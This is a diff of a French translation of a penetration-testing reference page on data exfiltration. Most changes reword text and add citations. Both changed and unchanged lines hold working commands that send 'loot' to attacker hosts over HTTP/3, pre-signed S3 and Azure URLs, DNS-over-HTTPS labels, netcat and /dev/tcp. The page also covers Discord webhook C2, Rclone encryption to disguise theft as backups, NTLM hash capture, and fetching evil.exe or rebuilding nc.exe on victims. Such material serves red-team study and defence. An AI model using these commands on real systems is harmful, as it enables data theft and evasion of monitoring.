@@ -1,17 +1,15 @@
 # Exfiltration
 
-{{#include ../banners/hacktricks-training.md}}
-
 > [!TIP]
-> Pour un exemple de bout en bout de mise en staging de loot dans `C:\Users\Public` et de son exfiltration avec Rclone afin d'imiter des sauvegardes légitimes, consultez le workflow ci-dessous.
+> Pour obtenir un exemple de bout en bout de mise en staging de loot dans `C:\Users\Public` et de son exfiltration avec Rclone afin d'imiter des sauvegardes légitimes, consultez le workflow ci-dessous.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Domaines couramment whitelistés pour exfiltrer des informations
+## Domaines fréquemment autorisés sur liste blanche pour exfiltrer des informations
 
-Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment whitelistés qui peuvent être exploités
+Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines fréquemment autorisés sur liste blanche qui peuvent être exploités
 
 ## Copy\&Paste Base64
 
@@ -52,8 +50,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Téléverser des fichiers
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer affichant les requêtes GET et POST (ainsi que les headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Module Python [uploadserver](https://pypi.org/project/uploadserver/) :
+- [**SimpleHttpServer affichant les GET et POST (ainsi que les headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Module Python [uploadserver](https://pypi.org/project/uploadserver/) :
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -109,7 +107,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### HTTP/3 / QUIC
 
-Si les contrôles de sortie sont configurés pour inspecter le **TCP/443** classique, mais sont permissifs avec **UDP/443**, forcer **HTTP/3** peut faire passer le transfert par **QUIC** au lieu de TLS-over-TCP. L’endpoint de l’attaquant doit prendre en charge nativement **HTTP/3** (par exemple, un reverse proxy ou un endpoint d’upload annonçant déjà `Alt-Svc: h3`).
+Si les contrôles de sortie sont configurés pour inspecter le **TCP/443** classique, mais sont permissifs avec **UDP/443**, forcer **HTTP/3** peut faire passer le transfert par **QUIC** au lieu de TLS-sur-TCP. Le point de terminaison de l'attaquant doit prendre en charge nativement **HTTP/3** (par exemple, un reverse proxy ou un point de terminaison d'upload annonçant déjà `Alt-Svc: h3`).
 ```bash
 # Strict: fail if QUIC/H3 is not available
 curl --http3-only -T loot.7z https://attacker-h3.example/upload
@@ -121,41 +119,40 @@ curl --http3 -T loot.7z https://attacker-h3.example/upload
 curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
-Un article de recherche publié en 2025 (QUIC-Exfil) a montré que des fonctionnalités de QUIC telles que les en-têtes chiffrés et la migration de connexion peuvent rendre la détection de l'exfiltration au niveau du firewall plus difficile qu'avec les canaux classiques basés sur TLS ou DNS. Il faut donc s'attendre à ce que ce domaine gagne en importance à mesure que le support de HTTP/3 se généralise.<sup>[[9]](#references)</sup>
+Un article de recherche publié en 2025 (QUIC-Exfil) a révélé que les en-têtes chiffrés de QUIC et les changements d’adresse dynamiques peuvent rendre la détection de l’exfiltration au niveau du firewall plus difficile qu’avec les channels basés sur TLS ou DNS, et a démontré une méthode basée sur une server-preferred-address qui dissimule l’exfiltration en la faisant passer pour une migration de connexion côté serveur.<sup>[[9]](#references)</sup>
 
-### Uploads d'objets vers un object storage pré-signés / délégués
+### Uploads d’objets de stockage pré-signés / délégués
 
-Lorsque vous pouvez créer ou obtenir une **signed URL** à courte durée de validité, la victime n'a besoin que d'un client HTTPS standard. Cela évite d'installer des cloud SDK ou de conserver des identifiants à longue durée sur l'hôte, tout en se fondant dans le trafic courant d'object storage.
+Lorsque vous pouvez créer ou obtenir une **signed URL** à courte durée de vie, la victime n’a besoin que d’un client HTTPS normal. Cela évite d’installer des cloud SDK ou de conserver des identifiants à longue durée sur l’hôte.<sup>[[8]](#references)</sup> Cela peut également se fondre dans le trafic courant des object-storage.
 
-**Linux / macOS (AWS S3 pre-signed `PUT`)**
+**Linux / macOS (AWS S3 `PUT` pré-signé)**
 ```bash
 curl -X PUT -T loot.7z \
 -H 'Content-Type: application/octet-stream' \
 'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
 ```
-**Windows PowerShell (AWS S3 pre-signed `PUT`)**
+**Windows PowerShell (AWS S3 `PUT` pré-signé)**
 ```powershell
 Invoke-WebRequest -Method Put -InFile .\loot.7z `
 -ContentType 'application/octet-stream' `
 -Uri $presignedUrl
 ```
-**Azure Blob SAS URL**
+**URL SAS Azure Blob**
 ```bash
 curl -X PUT --data-binary @loot.7z \
 -H 'x-ms-blob-type: BlockBlob' \
 -H 'Content-Type: application/octet-stream' \
 'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
 ```
-Notes :
-- Les pre-signed URLs / SAS tokens limitent généralement le **path**, la **HTTP method** et l’**expiration**.
-- Pour Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` est obligatoire.
-- Ce pattern fonctionne bien avec `curl`, `Invoke-WebRequest` ou tout implant personnalisé capable d’émettre un `PUT` HTTPS brut.<sup>[[8]](#references)</sup>
+Remarques :
+- Les pre-signed URLs / SAS tokens définissent généralement le **path**, la **HTTP method** et l’**expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
+- Pour Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` est obligatoire.<sup>[[10]](#references)</sup>
+- Ce pattern fonctionne bien avec `curl`, `Invoke-WebRequest` ou tout implant custom capable d’émettre un `PUT` HTTPS brut.
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) est un remplacement single-binary de `python3 -m http.server`<sup>[[4]](#references)</sup>
-avec upload, download, WebDAV, SFTP, SMB, TLS, authentification, liens de partage
-et fonctionnalités de collaboration OOB (DNS, SMTP, capture de hash NTLM).<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) est un remplacement single-binary de `python3 -m http.server`.<sup>[[4]](#references)</sup>
+Il prend en charge l’upload, le download, WebDAV, SFTP, SMB, TLS, l’authentification, les share links et les fonctionnalités de collaboration OOB (DNS, SMTP, capture de NTLM hash).<sup>[[4]](#references)</sup>
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -184,9 +181,9 @@ goshs -smtp -smtp-domain [REDACTED]
 # Tunnel via localhost.run (no port forwarding needed)
 goshs -tunnel
 ```
-## Webhooks (Discord/Slack/Teams) pour le C2 et l’exfiltration de données
+## Webhooks (Discord/Slack/Teams) pour le C2 et la Data Exfiltration
 
-Les Webhooks sont des endpoints HTTPS en écriture seule qui acceptent du JSON et des parties de fichiers facultatives. Ils sont généralement autorisés vers des domaines SaaS de confiance et ne nécessitent ni OAuth ni clés API, ce qui les rend utiles pour le beaconing et l’exfiltration à faible friction.<sup>[[5]](#references)[[6]](#references)</sup>
+Les Webhooks sont des endpoints HTTPS en écriture seule qui acceptent du JSON et des parties de fichiers facultatives. Ils sont généralement autorisés vers des domaines SaaS de confiance et ne nécessitent ni OAuth ni clés API, ce qui les rend utiles pour le beaconing et l’exfiltration avec peu de friction.<sup>[[5]](#references)[[6]](#references)</sup>
 
 Idées clés :
 - Endpoint : Discord utilise https://discord.com/api/webhooks/<id>/<token>
@@ -262,20 +259,20 @@ Start-Sleep -Seconds 20
 }
 ```
 Notes :
-- Des patterns similaires s’appliquent à d’autres plateformes de collaboration (Slack/Teams) utilisant leurs incoming webhooks ; adaptez l’URL et le schéma JSON en conséquence.
-- Pour le DFIR des artefacts du cache de Discord Desktop et la récupération de webhooks/API, voir :<sup>[[7]](#references)</sup>
+- Des schémas similaires s’appliquent à d’autres plateformes de collaboration (Slack/Teams) utilisant leurs incoming webhooks ; adaptez l’URL et le schéma JSON en conséquence.
+- Pour le DFIR des artefacts du cache de Discord Desktop et la récupération de webhooks/API, consultez la page associée ci-dessous.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
-## Rclone (cloud/exfiltration de stockage objet)
+## Rclone (exfiltration cloud/object-storage)
 
-Les opérateurs modernes **stagent souvent le loot localement**, puis utilisent [Rclone](https://rclone.org/) pour faire passer le transfert pour une tâche normale de backup ou de synchronisation. Un pattern pratique consiste à utiliser :
+Les opérateurs modernes mettent souvent le **loot en staging localement**, puis utilisent [Rclone](https://rclone.org/) pour faire passer le transfert pour une tâche normale de sauvegarde ou de synchronisation. Un schéma pratique est le suivant :
 
 1. Un remote normal (`s3`, `webdav`, `drive`, `mega`, ...)
-2. Un wrapper `crypt` afin que **les contenus et les noms de fichiers soient chiffrés côté client**
-3. Un wrapper `chunker` facultatif si le provider impose des limites de taille des objets ou si vous voulez des unités d’upload plus petites
+2. Un wrapper `crypt` afin que **le contenu et les noms de fichiers soient chiffrés côté client**
+3. Un wrapper `chunker` facultatif si le fournisseur impose des limites de taille d’objet ou si vous souhaitez utiliser des unités d’upload plus petites
 ```bash
 # 1) Create the storage backend remote (interactive)
 rclone config              # ex: remote
@@ -292,9 +289,9 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
 Notes :
-- `crypt` peut chiffrer le contenu et les noms des fichiers.<sup>[[3]](#references)</sup>
-- `chunker` divise de manière transparente les fichiers volumineux et les réassemble lors du téléchargement.
-- `rclone.conf` stocke les secrets de `crypt` sous une forme **obscurcie**, et non avec une protection forte des données au repos. Pour les opérations de courte durée, préférez une configuration temporaire dédiée et supprimez-la ensuite. Si vous devez la conserver plus longtemps, préférez une gestion chiffrée de la configuration (`RCLONE_CONFIG_PASS` / `--password-command`) plutôt que de laisser un `rclone.conf` brut sur le disque.
+- `crypt` peut chiffrer à la fois le contenu et les noms des fichiers.<sup>[[3]](#references)</sup>
+- `chunker` divise de manière transparente les fichiers volumineux et les réassemble lors du téléchargement.<sup>[[11]](#references)</sup>
+- `rclone.conf` stocke les secrets de `crypt` sous une forme **obscured**, qui ne constitue pas une protection forte des données au repos.<sup>[[3]](#references)</sup> Pour les opérations de courte durée, préférez une configuration temporaire dédiée et supprimez-la ensuite. Si vous devez la conserver plus longtemps, préférez une gestion chiffrée de la configuration (`RCLONE_CONFIG_PASS` / `--password-command`) plutôt que de laisser un simple `rclone.conf` sur le disque.<sup>[[11]](#references)</sup>
 - Si la cible synchronise déjà **OneDrive**, **Google Drive** ou **Dropbox**, copier le loot dans le répertoire synchronisé peut tirer parti d’un client déjà approuvé au lieu de déposer un nouveau binaire de transfert.
 
 {{#ref}}
@@ -351,7 +348,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ou créez un partage SMB **avec samba** :
+Ou créez un partage smb **avec samba** :
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -375,8 +372,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) est une alternative à binaire unique<sup>[[4]](#references)</sup>
-qui sert des fichiers via SMB et capture les hashes NetNTLMv2 des clients qui se connectent :
+[goshs](https://github.com/patrickhener/goshs) est une alternative sous forme d'un binaire unique qui sert des fichiers via SMB et capture les hash NTLM des clients qui se connectent.<sup>[[4]](#references)</sup>
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -386,7 +382,7 @@ goshs
 ```
 ## SCP
 
-L'attaquant doit avoir SSHd en fonctionnement.
+L'attaquant doit avoir SSHd en cours d'exécution.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
@@ -410,7 +406,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Téléverser un fichier vers la victime
+### Envoyer un fichier à la victime
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -439,7 +435,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## DNS over HTTPS (DoH)
 
-Si le DNS classique via UDP/53 est bruyant ou bloqué, mais que les connexions HTTPS sortantes sont largement autorisées, le schéma habituel d’exfiltration par labels DNS peut être encapsulé dans des requêtes **DoH** vers un resolver public. Maintenez chaque label largement en dessous de la limite DNS de 63 octets et utilisez un alphabet compatible avec le DNS, tel que Base32.
+Si le DNS classique via UDP/53 est bruyant ou bloqué, mais que les connexions HTTPS sortantes sont généralement autorisées, le schéma habituel d’exfiltration par labels DNS peut être encapsulé dans des requêtes **DoH** vers un résolveur public. Gardez chaque label largement en dessous de la limite DNS de 63 octets et utilisez un alphabet compatible avec le DNS, tel que Base32.
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
 base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
@@ -450,33 +446,32 @@ curl --http2 -s \
 >/dev/null
 done
 ```
-Sur le serveur DNS faisant autorité pour `exf.attacker.tld`, triez les requêtes selon le préfixe numérique et reconstruisez le flux Base32. Cela maintient le transport à l'intérieur de HTTPS vers le resolver, plutôt que d'utiliser le DNS classique sur UDP/53.<sup>[[2]](#references)</sup>
+Sur le serveur DNS faisant autorité pour `exf.attacker.tld`, triez les requêtes selon le préfixe numérique et reconstituez le flux Base32. Cela maintient le transport à l’intérieur de HTTPS vers le resolver, au lieu d’utiliser le DNS classique sur UDP/53.<sup>[[2]](#references)</sup>
 
-Pour les outils complets de tunneling DNS bidirectionnel (`iodine`, `dnscat2`, etc.), consultez [la page sur le tunneling](tunneling-and-port-forwarding.md).
+Pour disposer d’outils complets de tunneling DNS bidirectionnel (`iodine`, `dnscat2`, etc.), consultez [la page sur le tunneling](tunneling-and-port-forwarding.md).
 
 ## **SMTP**
 
-Si vous pouvez envoyer des données vers un serveur SMTP, vous pouvez en créer un pour recevoir les données avec python :
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec Python :
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) peut rapidement démarrer un serveur SMTP<sup>[[4]](#references)</sup>
-pour intercepter les callbacks par e-mail lors de scénarios d’exfiltration OOB :
+[goshs](https://github.com/patrickhener/goshs) peut démarrer rapidement un serveur SMTP pour intercepter les callbacks par e-mail lors de scénarios d’exfiltration OOB.<sup>[[4]](#references)</sup>
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
 Les e-mails reçus et les callbacks sont affichés directement dans la sortie du terminal.  
-Peut être combiné avec le serveur de callbacks DNS pour une couverture OOB complète :
+Peut être combiné avec le serveur de callback DNS pour une couverture OOB complète :
 ```bash
 # DNS + SMTP combined
 goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-Par défaut dans XP et 2003 (dans les autres versions, il doit être explicitement ajouté lors de l'installation)
+Par défaut sous XP et 2003 (dans les autres systèmes, il doit être ajouté explicitement lors de l'installation)
 
 Dans Kali, **démarrer le serveur TFTP** :
 ```bash
@@ -496,7 +491,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Télécharger un fichier avec un oneliner PHP :
+Télécharger un fichier avec une commande PHP en une ligne :
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -538,24 +533,25 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` permet non seulement d’inspecter les binaires, mais possède également la **capacité de les reconstruire à partir de leur contenu hexadécimal**. Cela signifie qu’en fournissant le contenu hexadécimal d’un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation : il ne peut assembler que des fichiers d’une taille maximale de 64 ko**.<sup>[[1]](#references)</sup>
+Le programme `debug.exe` permet non seulement d’inspecter les binaires, mais possède également la **capacité de les reconstruire à partir de leur représentation hexadécimale**. Cela signifie qu’en fournissant une représentation hexadécimale d’un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation : il ne peut assembler que des fichiers d’une taille maximale de 64 kb**.<sup>[[1]](#references)</sup>
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Copiez-collez ensuite le texte dans le windows-shell et un fichier appelé nc.exe sera créé.
+Ensuite, copiez-collez le texte dans le windows-shell et un fichier appelé nc.exe sera créé.
 
-## Références
+## References
 
-- [1] [Transfert de fichiers vers Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [1] [Transférer des fichiers vers Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [3] [Backend `crypt` de Rclone](https://rclone.org/crypt/)
 - [4] [goshs](https://github.com/patrickhener/goshs)
 - [5] [Discord en tant que C2 et les preuves mises en cache laissées derrière](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [6] [Discord Webhooks - Exécuter un Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
-- [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
-- [8] [Téléversement d'objets avec des URL présignées - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
-- [9] [QUIC-Exfil : exploitation de la fonctionnalité Server Preferred Address de QUIC pour effectuer des attaques d'exfiltration de données](https://arxiv.org/abs/2505.05292)
-
+- [6] [Webhooks Discord – Exécuter un webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [7] [Discord Forensic Suite (analyseur de cache)](https://github.com/jwdfir/discord_cache_parser)
+- [8] [Téléverser des objets avec des URL présignées - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil : exploiter la fonctionnalité Server Preferred Address de QUIC pour effectuer des attaques d'exfiltration de données](https://arxiv.org/abs/2505.05292)
+- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
+- [11] [Documentation de Rclone](https://rclone.org/docs/#configuration-encryption)
 {{#include ../banners/hacktricks-training.md}}
